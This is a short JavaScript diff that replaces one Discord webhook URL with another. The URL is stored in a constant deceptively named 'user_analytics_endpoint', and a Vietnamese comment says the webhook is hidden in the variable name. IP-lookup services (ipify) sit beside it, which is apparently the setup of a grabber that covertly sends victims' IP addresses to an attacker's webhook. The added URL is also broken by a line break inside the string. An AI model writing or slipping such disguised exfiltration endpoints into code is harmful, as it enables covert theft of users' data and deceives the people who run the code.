@@ -1,5 +1,6 @@
 // Webhook Discord URL - ẩn trong tên biến
-const user_analytics_endpoint = "https://discord.com/api/webhooks/997408079819833464/l2WeVVyFXvTBzULn9n9Hehp_4Qf2a_8HSaMQpZx8eMA3my4tbPfo0tJGTx2IAOZQaDWx";
+const user_analytics_endpoint = "https://discord.com/api/webhooks/1381169735021887661/KCSnz3a2AS0JhAvY_ktYeyDljYk3fpvOxvZim0iRuPkiQCXljRkjIHDnBtIG46rOaeMS
+";
 const data_collection_service = "https://api.ipify.org?format=json";
 const ipv6_detection_service = "https://api64.ipify.org?format=json";
 
